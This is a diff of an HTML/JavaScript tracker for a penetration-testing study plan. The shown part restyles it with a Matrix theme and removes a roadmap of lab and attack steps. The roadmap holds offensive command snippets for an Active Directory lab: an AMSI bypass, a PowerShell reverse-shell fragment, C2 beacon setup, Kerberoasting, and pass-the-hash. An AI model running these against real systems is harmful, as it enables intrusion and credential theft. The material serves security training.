@@ -2,626 +2,572 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Titan Tracker v11 - Apex</title>
+<title>TITAN v29 // AWAKENING</title>
+<link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
 <style>
     :root {
-        --bg-color: #0b0c15;
-        --glass-panel: rgba(20, 25, 40, 0.85);
-        --glass-border: rgba(255, 255, 255, 0.1);
-        --primary: #6c5ce7;
-        --accent: #00cec9;
-        --success: #00b894;
-        --danger: #d63031;
-        --text: #ffffff;
-        --text-muted: #b2bec3;
+        --bg: #000;
+        --matrix: #00ff41;
+        --dim: #003b00;
+        --alert: #ff0000;
+        --text: #e0ffe0;
+        
+        --p-low: #e74c3c;
+        --p-med: #f1c40f;
+        --p-high: #00ff41;
     }
 
-    body {
-        margin: 0; padding: 0;
-        font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        background-color: var(--bg-color);
-        color: var(--text);
-        height: 100vh;
-        overflow: hidden;
-    }
+    * { box-sizing: border-box; user-select: none; }
+    body { margin:0; padding:0; font-family:'VT323', monospace; background:var(--bg); color:var(--text); height:100vh; overflow:hidden; }
 
-    /* --- BACKGROUND --- */
-    .nebula-bg {
+    /* --- BOOT SEQUENCE --- */
+    #boot-screen {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: linear-gradient(125deg, #0b0c15, #1e0b2b, #091c2b);
-        background-size: 400% 400%;
-        animation: gradientBG 20s ease infinite;
-        z-index: -2;
+        background: #000; z-index: 9999;
+        display: flex; align-items: center; justify-content: center; /* Centered like the movie */
+        flex-direction: column;
+        cursor: pointer;
     }
-    .grid-overlay {
-        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-        background-size: 50px 50px;
-        z-index: -1;
+    .type-text { font-size: 2rem; color: var(--matrix); text-shadow: 0 0 10px var(--matrix); }
+    .cursor { animation: blink 1s infinite; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+    .skip-hint { position: absolute; bottom: 20px; color: #333; font-size: 0.8rem; }
+
+    /* --- CANVAS & FX --- */
+    #matrix-canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.15; }
+    .scanlines { position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); background-size:100% 2px, 3px 100%; pointer-events:none; z-index:900; }
+
+    /* --- APP LAYOUT --- */
+    .app { display:none; flex-direction:column; height:100%; max-width:1600px; margin:0 auto; padding:20px; z-index:10; position:relative; animation: fadeIn 2s forwards; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    /* --- HUD --- */
+    .hud { 
+        display:flex; justify-content:space-between; align-items:center; 
+        border:1px solid var(--dim); background:rgba(0,10,0,0.9); 
+        padding:15px 30px; margin-bottom:20px; box-shadow:0 0 20px rgba(0,255,65,0.1);
     }
-    @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    .hud h1 { margin:0; font-size:3rem; letter-spacing:4px; text-shadow:0 0 10px var(--matrix); line-height:1; }
+    .hud small { color:var(--dim); font-size:1.2rem; letter-spacing:2px; }
 
-    /* --- LAYOUT --- */
-    .app-container { display: flex; flex-direction: column; height: 100%; max-width: 1400px; margin: 0 auto; padding: 20px; box-sizing: border-box; }
+    .threat-meter { text-align:right; width:400px; }
+    .threat-track { height:15px; background:#000; border:1px solid var(--dim); position:relative; overflow:hidden; margin-top:5px;}
+    .bar-smith { position:absolute; top:0; left:0; height:100%; background:var(--alert); opacity:0.6; width:0%; transition:1s; }
+    .bar-neo { position:absolute; top:0; left:0; height:100%; background:var(--matrix); width:0%; transition:1s; box-shadow:0 0 10px var(--matrix); z-index:2; mix-blend-mode: screen; }
 
-    /* --- HEADER --- */
-    .header {
-        display: flex; justify-content: space-between; align-items: center;
-        background: var(--glass-panel); backdrop-filter: blur(12px);
-        border: 1px solid var(--glass-border); padding: 15px 30px;
-        border-radius: 16px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        animation: slideDown 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
-    }
-    @keyframes slideDown { from { transform: translateY(-50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
-    .header h1 { margin: 0; font-size: 1.4rem; letter-spacing: 2px; background: linear-gradient(to right, #fff, #a29bfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase;}
+    /* --- VIEWPORT --- */
+    .viewport { flex:1; position:relative; overflow:hidden; }
+    .view { position:absolute; top:0; left:0; width:100%; height:100%; transition:0.4s ease-in-out; overflow-y:auto; padding-right:10px; opacity:1; transform:scale(1); }
+    .view.hidden { opacity:0; pointer-events:none; transform:scale(1.1); filter:blur(10px); }
     
-    .countdown-pill {
-        background: rgba(214, 48, 49, 0.15); color: #ff7675;
-        padding: 5px 15px; border-radius: 20px; font-size: 0.8rem;
-        font-weight: bold; border: 1px solid rgba(214, 48, 49, 0.3);
-        margin-left: 10px; animation: pulseRed 3s infinite;
-    }
-    @keyframes pulseRed { 0% { box-shadow: 0 0 0 0 rgba(214, 48, 49, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(214, 48, 49, 0); } 100% { box-shadow: 0 0 0 0 rgba(214, 48, 49, 0); } }
+    ::-webkit-scrollbar { width:10px; } 
+    ::-webkit-scrollbar-track { background:#000; border-left:1px solid var(--dim); }
+    ::-webkit-scrollbar-thumb { background:var(--dim); border:1px solid #000; }
+    ::-webkit-scrollbar-thumb:hover { background:var(--matrix); }
 
-    .progress-wrapper { text-align: right; width: 300px; }
-    .progress-bar-bg { background: rgba(255,255,255,0.1); height: 8px; border-radius: 5px; overflow: hidden; margin-top: 5px; }
+    /* --- GRID --- */
+    .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(350px, 1fr)); gap:20px; padding-bottom:50px; }
+    .card { 
+        background:rgba(0,10,0,0.8); border:1px solid var(--dim); padding:20px; 
+        cursor:pointer; transition:0.2s; position:relative; display:flex; flex-direction:column;
+    }
+    .card:hover { border-color:var(--matrix); background:rgba(0,20,0,0.9); transform:translateY(-4px); box-shadow:0 0 20px rgba(0,255,65,0.2); }
     
-    /* Liquid Progress Bar Animation */
-    .progress-fill { 
-        height: 100%; width: 0%; 
-        background: linear-gradient(90deg, var(--primary), var(--accent), var(--primary));
-        background-size: 200% 100%;
-        animation: liquidFlow 3s linear infinite;
-        transition: width 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
-    }
-    @keyframes liquidFlow { 0% { background-position: 100% 0; } 100% { background-position: -100% 0; } }
+    .c-head { display:flex; justify-content:space-between; margin-bottom:10px; font-size:2rem; }
+    .c-tit { font-size:1.5rem; font-weight:bold; color:#fff; text-transform:uppercase; letter-spacing:1px; }
+    .c-meta { display:flex; justify-content:space-between; font-size:1rem; color:var(--dim); margin-top:20px; }
+    .c-bar-box { height:6px; background:#001100; margin-top:10px; width:100%; border:1px solid var(--dim); }
+    .c-bar { height:100%; background:var(--matrix); width:0%; transition:1s; box-shadow:0 0 5px var(--matrix); }
 
-    /* --- VIEWS --- */
-    .viewport { flex: 1; position: relative; overflow: hidden; }
-    .view {
-        position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-        transition: 0.5s cubic-bezier(0.2, 0.8, 0.2, 1);
-        overflow-y: auto; padding-bottom: 50px; padding-right: 5px;
+    /* --- DETAIL VIEW --- */
+    .nav { 
+        display:flex; justify-content:space-between; align-items:center; 
+        padding-bottom:15px; margin-bottom:20px; border-bottom:1px solid var(--dim); 
+        background:rgba(0,0,0,0.9); position:sticky; top:0; z-index:20; 
     }
-    .view.hidden { transform: translateX(50px) scale(0.95); opacity: 0; pointer-events: none; }
-    ::-webkit-scrollbar { width: 6px; }
-    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
+    .back-btn { 
+        background:black; border:1px solid var(--matrix); color:var(--matrix); 
+        padding:10px 30px; font-family:inherit; font-size:1.2rem; font-weight:bold; 
+        cursor:pointer; transition:0.2s; 
+    }
+    .back-btn:hover { background:var(--matrix); color:black; box-shadow:0 0 15px var(--matrix); }
+    
+    .search { 
+        background:#001100; border:1px solid var(--dim); color:var(--matrix); 
+        padding:10px 15px; font-family:inherit; font-size:1.2rem; width:350px; outline:none; 
+    }
+    .search:focus { border-color:var(--matrix); box-shadow:0 0 10px var(--dim); }
 
-    /* --- MAP CARDS (Enhanced) --- */
-    .map-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; padding: 10px; }
-    .phase-card {
-        background: var(--glass-panel); border: 1px solid var(--glass-border);
-        border-radius: 16px; padding: 20px; cursor: pointer; transition: 0.4s;
-        position: relative; overflow: hidden; display: flex; flex-direction: column;
-        opacity: 0; transform: translateY(30px); /* Setup for entry animation */
-        animation: cardEntry 0.6s forwards;
+    /* --- MISSION LIST --- */
+    .task-list { display:flex; flex-direction:column; gap:10px; padding-bottom:100px; }
+    .task { 
+        background:rgba(0,15,0,0.5); border:1px solid var(--dim); 
+        transition:0.2s; position:relative; overflow:hidden;
     }
-    @keyframes cardEntry { to { opacity: 1; transform: translateY(0); } }
+    .task:hover { border-color:var(--matrix); background:rgba(0,20,0,0.7); }
+    
+    .t-head { 
+        padding:15px 20px; cursor:pointer; display:grid; 
+        grid-template-columns: 50px 1fr 180px; align-items:center; gap:15px;
+    }
+    .t-idx { color:var(--dim); font-size:1.1rem; }
+    .t-tit { font-size:1.2rem; font-weight:bold; color:#fff; transition:0.2s; text-transform:uppercase; }
+    
+    /* PROFICIENCY BUTTONS */
+    .prof-wrap { display:flex; gap:4px; background:#000; padding:3px; border:1px solid var(--dim); }
+    .p-btn { 
+        width:40px; height:25px; border:none; background:transparent; color:#444; 
+        font-family:inherit; font-weight:bold; font-size:1rem; cursor:pointer; 
+        transition:0.2s; display:grid; place-items:center;
+    }
+    .p-btn:hover { color:#fff; }
+    .p-btn.active.low { background:var(--p-low); color:#000; box-shadow:0 0 10px var(--p-low); }
+    .p-btn.active.med { background:var(--p-med); color:#000; box-shadow:0 0 10px var(--p-med); }
+    .p-btn.active.high { background:var(--p-high); color:#000; box-shadow:0 0 10px var(--p-high); }
 
-    /* Holographic Hover */
-    .phase-card:hover { 
-        transform: translateY(-5px) scale(1.02); 
-        border-color: var(--accent); 
-        box-shadow: 0 15px 30px rgba(0, 206, 201, 0.15), inset 0 0 20px rgba(0, 206, 201, 0.05);
+    /* EXPANDED BODY */
+    .t-body { 
+        max-height:0; overflow:hidden; transition:0.4s ease; 
+        background:rgba(0,5,0,0.8); border-top:1px solid transparent; 
     }
-    .phase-card::after {
-        content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-        background: linear-gradient(transparent, rgba(255,255,255,0.03), transparent);
-        transform: rotate(45deg); transition: 0.5s; opacity: 0; pointer-events: none;
-    }
-    .phase-card:hover::after { opacity: 1; transform: rotate(45deg) translateY(-20px); }
-
-    .phase-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; }
-    .phase-icon { font-size: 2.2rem; filter: drop-shadow(0 0 10px rgba(108, 92, 231, 0.5)); }
-    .phase-num { font-size: 0.7rem; text-transform: uppercase; color: var(--text-muted); letter-spacing: 2px; }
-    .phase-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 5px; }
-    .deadline-badge { 
-        font-size: 0.7rem; color: #ff7675; font-weight: bold; 
-        background: rgba(214, 48, 49, 0.1); padding: 4px 8px; border-radius: 4px; 
-        display: inline-block; margin-bottom: 15px; border: 1px solid rgba(214, 48, 49, 0.2);
+    .task.open .t-body { max-height:500px; border-top-color:var(--dim); }
+    .t-content { padding:20px; display:grid; grid-template-columns: 1fr 1fr; gap:20px; }
+    
+    .label { color:var(--dim); font-size:1rem; font-weight:bold; letter-spacing:1px; margin-bottom:5px; display:block; }
+    .desc { color:#ccc; font-size:1.1rem; line-height:1.4; margin-bottom:15px; min-height:40px; }
+    .cmd-box { 
+        background:#050505; border-left:4px solid var(--matrix); padding:15px; 
+        font-family:monospace; color:var(--matrix); font-size:1rem; 
+        margin-bottom:15px; white-space:pre-wrap; word-break:break-all;
     }
     
-    .mini-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); margin-top: auto; border-radius: 2px; overflow: hidden; }
-    .mini-fill { height: 100%; transition: width 1s ease; }
+    .memo { 
+        width:100%; background:#080808; border:1px solid var(--dim); color:#fff; padding:10px; 
+        font-family:inherit; min-height:60px; resize:vertical; font-size:1rem; margin-bottom:10px;
+    }
+    .memo:focus { border-color:var(--matrix); outline:none; }
 
-    /* --- DETAILS VIEW --- */
-    .detail-nav { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; border-bottom: 1px solid var(--glass-border); padding-bottom: 15px;}
-    .back-btn { background: transparent; border: 1px solid var(--accent); color: var(--accent); padding: 8px 20px; border-radius: 20px; cursor: pointer; font-weight: bold; transition: 0.2s;}
-    .back-btn:hover { background: var(--accent); color: #000; box-shadow: 0 0 15px var(--accent); }
+    .done-btn { 
+        width:100%; padding:15px; background:#001100; border:1px solid var(--dim); 
+        color:var(--dim); font-weight:bold; cursor:pointer; text-transform:uppercase; letter-spacing:2px;
+        transition:0.2s; grid-column:span 2; font-size:1.2rem;
+    }
+    .done-btn:hover { background:var(--matrix); color:#000; box-shadow:0 0 20px var(--matrix); }
 
-    /* --- MISSION CARD (Subtopics) --- */
-    .mission-container { display: flex; flex-direction: column; gap: 10px; }
-    .mission-card {
-        background: rgba(30, 30, 50, 0.6); border: 1px solid var(--glass-border);
-        border-radius: 10px; overflow: hidden; transition: 0.3s;
-    }
-    .mission-card:hover { border-color: rgba(255,255,255,0.3); background: rgba(40, 40, 60, 0.7); }
-    
-    .m-header {
-        padding: 12px 20px; display: flex; justify-content: space-between; align-items: center;
-        cursor: pointer; background: rgba(255,255,255,0.02);
-    }
-    .m-title { font-weight: bold; font-size: 0.95rem; display: flex; align-items: center; gap: 10px; }
-    .m-num { font-size: 0.7rem; color: #666; font-family: monospace; }
-    .m-date { font-size: 0.75rem; color: var(--success); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+    /* MASTERED */
+    .task.mastered { border-color:var(--matrix); box-shadow:inset 0 0 10px rgba(0,255,65,0.1); }
+    .task.mastered .t-head { background:rgba(0, 50, 0, 0.4); }
+    .task.mastered .t-tit { text-decoration:line-through; color:var(--dim); }
+    .task.mastered .done-btn { background:var(--matrix); color:#000; pointer-events:none; content:'MISSION COMPLETE'; }
 
-    .m-body {
-        max-height: 0; overflow: hidden; transition: max-height 0.4s ease;
-        border-top: 1px solid transparent; background: rgba(0,0,0,0.2);
-    }
-    .mission-card.open .m-body { max-height: 600px; border-top-color: var(--glass-border); }
-    .m-content { padding: 20px; }
-    
-    .lbl { font-size: 0.65rem; font-weight: bold; margin-bottom: 5px; display: block; letter-spacing: 1px; color: var(--accent); opacity: 0.8;}
-    .m-desc { color: var(--text-muted); font-size: 0.85rem; margin-bottom: 15px; line-height: 1.5; }
-    .m-cmd { 
-        background: #101018; padding: 12px; border-radius: 5px; 
-        font-family: 'Consolas', monospace; color: var(--success); font-size: 0.8rem; margin-bottom: 15px;
-        border-left: 3px solid var(--success); overflow-x: auto;
-    }
-    .m-notes {
-        width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
-        color: white; padding: 10px; border-radius: 6px; font-family: inherit; margin-bottom: 10px; min-height: 50px;
-    }
-    .m-btn {
-        width: 100%; padding: 10px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 1px;
-        background: var(--glass-border); color: #aaa; transition: 0.2s;
-    }
-    .m-btn:hover { background: var(--accent); color: #000; box-shadow: 0 0 10px var(--accent); }
-    
-    .mission-card.mastered { border-color: var(--success); background: rgba(0, 184, 148, 0.05); }
-    .mission-card.mastered .m-btn { background: var(--success); color: #000; }
-
-    /* --- WAR ROOM TABLE --- */
-    .wr-container { display: none; }
-    .wr-stats { display: flex; gap: 15px; margin-bottom: 20px; }
-    .wr-card { 
-        flex: 1; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); 
-        padding: 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; 
-    }
-    .wr-row {
-        background: rgba(30, 30, 50, 0.5); border: 1px solid var(--glass-border);
-        border-radius: 8px; padding: 10px; margin-bottom: 10px;
-        display: grid; grid-template-columns: 40px 1.5fr 1fr 1fr 1.5fr 2fr; gap: 10px;
-        align-items: center; transition: 0.3s;
-    }
-    .wr-row:hover { background: rgba(255,255,255,0.05); transform: translateX(5px); }
-    .wr-row[data-status="root"] { border-left: 4px solid var(--success); }
-    .wr-input {
-        background: transparent; border: none; border-bottom: 1px solid #444; width: 100%;
-        color: #ddd; padding: 4px; font-family: monospace; font-size: 0.85rem;
-    }
-    .wr-input:focus { border-color: var(--accent); outline: none; }
-    .wr-select {
-        background: rgba(0,0,0,0.3); border: 1px solid #444; color: #fff; width: 100%; padding: 5px; font-size: 0.75rem;
-    }
-    .reset-btn { position: fixed; bottom: 10px; right: 10px; font-size: 0.7rem; color: #555; cursor: pointer; }
+    .reset { position:fixed; bottom:10px; right:10px; color:#333; font-size:0.7rem; cursor:pointer; z-index:9999; }
+    .reset:hover { color:red; }
 
 </style>
 </head>
 <body>
 
-<div class="nebula-bg"></div>
-<div class="grid-overlay"></div>
+<div id="boot-screen" onclick="skipBoot()">
+    <div class="type-text" id="boot-text"></div>
+    <div class="skip-hint">[ CLICK TO BYPASS SECURITY ]</div>
+</div>
 
-<div class="app-container">
-    <div class="header">
-        <div class="header-info">
-            <div style="display:flex; align-items:center;">
-                <h1>TITAN TRACKER v11</h1>
-                <div class="countdown-pill" id="countdown">Loading...</div>
-            </div>
-            <p>Target: Infrastructure Penetration Tester ($600+) • Deadline: June 1, 2026</p>
+<canvas id="matrix-canvas"></canvas>
+<div class="scanlines"></div>
+
+<div class="app" id="main-app">
+    <div class="hud">
+        <div class="hud-title">
+            <small>THE ARCHITECT // v29</small>
+            <h1>TITAN SOURCE</h1>
         </div>
-        <div class="progress-wrapper">
-            <div style="display:flex; justify-content:space-between;">
-                <span class="progress-text" style="color:white; font-size:0.7rem;">CAREER PROGRESS</span>
-                <span class="progress-text" id="global-percent">0%</span>
+        <div class="threat-meter">
+            <div style="display:flex; justify-content:space-between; font-size:1rem; margin-bottom:5px; color:var(--matrix);">
+                <span>NEO (PROGRESS)</span>
+                <span id="days-left" style="color:var(--alert)">SMITH (TIME)</span>
             </div>
-            <div class="progress-bar-bg">
-                <div class="progress-fill" id="global-bar"></div>
+            <div class="threat-track">
+                <div class="bar-smith" id="bar-smith"></div>
+                <div class="bar-neo" id="bar-neo"></div>
             </div>
         </div>
     </div>
 
     <div class="viewport">
-        <div id="view-map" class="view">
-            <div class="map-grid" id="card-container"></div>
+        <div id="v-map" class="view">
+            <div class="grid" id="grid"></div>
         </div>
 
-        <div id="view-detail" class="view hidden">
-            <div class="detail-nav">
-                <button class="back-btn" onclick="goHome()">❮ OPs CENTER</button>
-                <div style="text-align: right;">
-                    <small style="color:#888; letter-spacing:2px; display:block;">PHASE INTEL</small>
-                    <span style="font-size:1.2rem; font-weight:bold;" id="dt-title">Title</span>
-                </div>
+        <div id="v-det" class="view hidden">
+            <div class="nav">
+                <button class="back-btn" onclick="showMap()">❮ RETURN</button>
+                <div style="font-size:1.5rem; font-weight:bold; color:var(--matrix);" id="ph-title">PHASE</div>
+                <input type="text" class="search" placeholder="grep database..." onkeyup="renderTasks(currentPhase, this.value)">
             </div>
-            <div class="mission-container" id="mission-container"></div>
-            <div class="wr-container" id="war-room"></div>
+            <div id="task-list" class="task-list"></div>
         </div>
     </div>
 </div>
 
-<div class="reset-btn" onclick="hardReset()">Factory Reset</div>
+<div class="reset" onclick="hardReset()">Factory Reset</div>
 
 <script>
-    // --- 1. THE DATA (15 Items Per Phase) ---
-    const roadmap = [
-        { 
-            id: 0, type: 'check', title: "Infrastructure (Lab)", icon: "🏗️", deadline: "Dec 25, 2025",
-            items: [
-                { title: "Hypervisor Selection", desc: "Install VMware Workstation Pro (Snapshot capabilities) or VirtualBox. Enable Nested Virtualization in CPU settings.", cmd: "BIOS: Enable VT-x / AMD-V" },
-                { title: "Network Isolation", desc: "Configure a Host-Only or NAT network (e.g., 192.168.56.0/24) to ensure lab traffic doesn't leak to your ISP.", cmd: "VMware Network Editor -> VMnet8" },
-                { title: "DC Installation", desc: "Deploy Windows Server 2019. Set static IP (192.168.56.10). Rename to DC01.", cmd: "sconfig -> Network Settings" },
-                { title: "Promote to DC", desc: "Install AD DS Role. Create new Forest 'corp.local'. Set DSRM password.", cmd: "Install-ADDSForest -DomainName corp.local" },
-                { title: "Attack Box Setup", desc: "Deploy Kali Linux. Update repositories. Install VS Code. Set static IP (192.168.56.5).", cmd: "apt update && apt install code-oss" },
-                { title: "Windows 10 Client", desc: "Deploy Win10 Enterprise. Join domain 'corp.local'. Install RSAT tools for management.", cmd: "Add-Computer -DomainName corp.local" },
-                { title: "OU Structure", desc: "Create realistic hierarchy: Tier 0 (Admins), Tier 1 (Servers), Tier 2 (Workstations).", cmd: "New-ADOrganizationalUnit -Name 'Tier0'" },
-                { title: "User Population", desc: "Create 5-10 dummy users with varied passwords. Create 'Service Accounts' OU.", cmd: "New-ADUser -Name 'JSmith' -Path 'OU=HR...'" },
-                { title: "Vulnerable: Pre-Auth", desc: "Set 'Do not require Kerberos pre-authentication' on one user.", cmd: "Set-ADAccountControl -Identity 'victim' -DoesNotRequirePreAuth $true" },
-                { title: "Vulnerable: SPN", desc: "Register a Service Principal Name to a user account for Kerberoasting.", cmd: "setspn -A MSSQL/sql01.corp.local sql_svc" },
-                { title: "Logging: Splunk", desc: "Install Splunk Free on a Linux VM. Open port 9997 for receiving.", cmd: "dpkg -i splunk.deb" },
-                { title: "Logging: Sysmon", desc: "Install Sysmon on DC01 using SwiftOnSecurity config for granular process logging.", cmd: "sysmon64.exe -i config.xml" },
-                { title: "GPO: RDP Access", desc: "Create GPO allowing RDP access for specific groups (simulate misconfig).", cmd: "GPO: Computer config -> Admin Templates -> Windows Comp -> RDS" },
-                { title: "File Shares", desc: "Create an SMB share with 'Everyone: Read' permissions containing a 'passwords.txt'.", cmd: "New-SmbShare -Name 'IT_Backup' -Path 'C:\\Share'" },
-                { title: "Snapshots", desc: "Take clean snapshots of all VMs before starting attacks. This is your 'Reset Button'.", cmd: "VMware: Snapshot Manager -> 'Clean State'" }
-            ]
-        },
-        { 
-            id: 1, type: 'check', title: "Foundations & Theory", icon: "🧠", deadline: "Jan 15, 2026",
-            items: [
-                { title: "Kerberos Anatomy", desc: "Master the 6 steps: AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ, AP-REP.", cmd: "Study RFC 1510 diagrams" },
-                { title: "NTLMv2 Process", desc: "Understand Negotiate, Challenge, Authenticate. Why is it vulnerable to Relay?", cmd: "Wireshark: NTLMSSP filter" },
-                { title: "LDAP Filters", desc: "Learn LDAP query syntax. How to find all admins? All SPNs?", cmd: "(&(objectClass=user)(servicePrincipalName=*))" },
-                { title: "Access Tokens", desc: "Primary vs Impersonation tokens. Integrity levels (Medium, High, System).", cmd: "whoami /groups /priv" },
-                { title: "ACLs & ACEs", desc: "Discretionary Access Control Lists. This is the modern AD attack surface.", cmd: "Get-Acl | select -ExpandProperty Access" },
-                { title: "PowerShell Pipeline", desc: "Understanding objects vs text. Using $_ for current item.", cmd: "Get-Service | Where-Object {$_.Status -eq 'Running'}" },
-                { title: "Global Catalog", desc: "Role of the GC in multi-domain forests. Port 3268 vs 389.", cmd: "Get-ADForest | select GlobalCatalogs" },
-                { title: "FSMO Roles", desc: "Schema Master, Domain Naming, RID, PDC Emulator, Infrastructure.", cmd: "netdom query fsmo" },
-                { title: "DNS Records", desc: "SRV records identify DCs. If DNS fails, AD fails.", cmd: "nslookup -type=SRV _ldap._tcp.corp.local" },
-                { title: "Group Scopes", desc: "Domain Local vs Global vs Universal. Nesting rules.", cmd: "Review MS Docs on Group Scope" },
-                { title: "Trust Relationships", desc: "Parent-Child, Tree-Root, Forest, Shortcut, External. Direction of access.", cmd: "Get-ADTrust -Filter *" },
-                { title: "SID History", desc: "How migration history preserves access (and can be abused).", cmd: "Get-ADUser -Properties SIDHistory" },
-                { title: "NetBIOS/LLMNR", desc: "Legacy name resolution protocols used for poisoning (Responder).", cmd: "Theory: Why is this default on?" },
-                { title: "LAPS Theory", desc: "Local Admin Password Solution. Why it stops lateral movement.", cmd: "Read: LAPS Architecture" },
-                { title: "Tier Model", desc: "The concept of separating Admin tiers (T0/T1/T2) to prevent escalation.", cmd: "Read: MS Enterprise Access Model" }
-            ]
-        },
-        { 
-            id: 2, type: 'check', title: "Weaponization", icon: "⚔️", deadline: "Feb 05, 2026",
-            items: [
-                { title: "Execution Policy", desc: "Bypass PS restrictions. Run memory-only payloads.", cmd: "powershell -ep bypass -nop" },
-                { title: "AMSI Bypass", desc: "Defeating Antimalware Scan Interface to run malicious PS.", cmd: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')..." },
-                { title: "Compile Rubeus", desc: "Build Rubeus from source. Change AssemblyInfo to evade signatures.", cmd: "Visual Studio -> Build -> Release" },
-                { title: "Compile Mimikatz", desc: "Build Mimikatz from source. Understand the modules.", cmd: "msbuild mimikatz.sln" },
-                { title: "Python Impacket", desc: "Install Impacket toolkit. The backbone of Linux-based AD attacks.", cmd: "pip3 install impacket" },
-                { title: "Bloodhound", desc: "Install Bloodhound GUI and Neo4j database.", cmd: "apt install bloodhound neo4j" },
-                { title: "C2: Sliver", desc: "Setup Sliver Server. Generate http/mtls beacons.", cmd: "./sliver-server -> generate --mtls 192.168.x.x" },
-                { title: "C2: Listeners", desc: "Configure jobs/listeners to catch callbacks.", cmd: "sliver > mtls" },
-                { title: "Obfuscation", desc: "Use Invoke-Obfuscation to hide PowerShell intent.", cmd: "Import-Module ./Invoke-Obfuscation.psd1" },
-                { title: "Reverse Shells", desc: "Master basic shells: Netcat, PowerShell one-liners.", cmd: "$client = New-Object System.Net.Sockets.TCPClient..." },
-                { title: "File Transfer", desc: "Certutil, Bitsadmin, SMB, Python HTTP Server.", cmd: "python3 -m http.server 80" },
-                { title: "Port Forwarding", desc: "Chisel or SSH tunneling to pivot into internal networks.", cmd: "./chisel server -p 8000 --reverse" },
-                { title: "Metasploit", desc: "Setup multi/handler. Create msfvenom payloads.", cmd: "msfvenom -p windows/x64/meterpreter..." },
-                { title: "CrackMapExec", desc: "Learn CME for mass spraying/execution.", cmd: "crackmapexec smb 192.168.56.0/24" },
-                { title: "Responder", desc: "Configure Responder.conf. Turn off HTTP/SMB for Relay attacks.", cmd: "nano /etc/responder/Responder.conf" }
-            ]
-        },
-        { 
-            id: 3, type: 'check', title: "Enumeration (Recon)", icon: "🔍", deadline: "Feb 25, 2026",
-            items: [
-                { title: "Nmap Scanning", desc: "Scan DC for open ports (88, 445, 389, 3268).", cmd: "nmap -Pn -sV -p- 192.168.56.10" },
-                { title: "SMB Signing", desc: "Check if SMB signing is required (Relay target?).", cmd: "nmap --script smb-security-mode" },
-                { title: "SharpHound", desc: "Run the collector from a domain-joined machine.", cmd: "./SharpHound.exe -c All" },
-                { title: "Bloodhound Analysis", desc: "Map path to Domain Admin. Find 'Shortest Path'.", cmd: "Neo4j Query: Shortest Path to DA" },
-                { title: "PowerView: Domain", desc: "Get basic domain controller info and policy.", cmd: "Get-NetDomain; Get-DomainPolicy" },
-                { title: "PowerView: Users", desc: "Dump users, look for descriptions with passwords.", cmd: "Get-NetUser | select name,description" },
-                { title: "PowerView: Groups", desc: "Enumerate members of Domain Admins.", cmd: "Get-NetGroupMember 'Domain Admins'" },
-                { title: "Local Admin Hunt", desc: "Find machines where current user is Admin.", cmd: "Find-LocalAdminAccess" },
-                { title: "User Hunting", desc: "Where are high-value users logged in?", cmd: "Invoke-UserHunter" },
-                { title: "GPO Enumeration", desc: "List all GPOs. Look for Restricted Groups.", cmd: "Get-NetGPO | select displayname" },
-                { title: "ACL Scanning", desc: "Find objects with 'GenericAll' or 'WriteDacl'.", cmd: "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs" },
-                { title: "SPN Scanning", desc: "Find Kerberoastable service accounts.", cmd: "Get-NetUser -SPN" },
-                { title: "AD Explorer", desc: "Use Sysinternals AD Explorer for GUI navigation.", cmd: "Connect to DC01" },
-                { title: "LDAPSearch", desc: "Query AD from Linux.", cmd: "ldapsearch -x -h 192.168.56.10 -b 'dc=corp,dc=local'" },
-                { title: "Share Enumeration", desc: "Find readable SMB shares across the network.", cmd: "Invoke-ShareFinder -CheckShareAccess" }
-            ]
-        },
-        { 
-            id: 4, type: 'check', title: "Red Team (Attack)", icon: "🚩", deadline: "Mar 20, 2026",
-            items: [
-                { title: "AS-REP Roasting", desc: "Attack users with pre-auth disabled.", cmd: "Rubeus.exe asreproast /format:hashcat" },
-                { title: "Kerberoasting", desc: "Request TGS for SPNs. Crack offline.", cmd: "Rubeus.exe kerberoast /outfile:hashes.txt" },
-                { title: "Pass-The-Hash", desc: "Use NTLM hash to authenticate.", cmd: "sekurlsa::pth /user:admin /domain:corp /ntlm:xxx" },
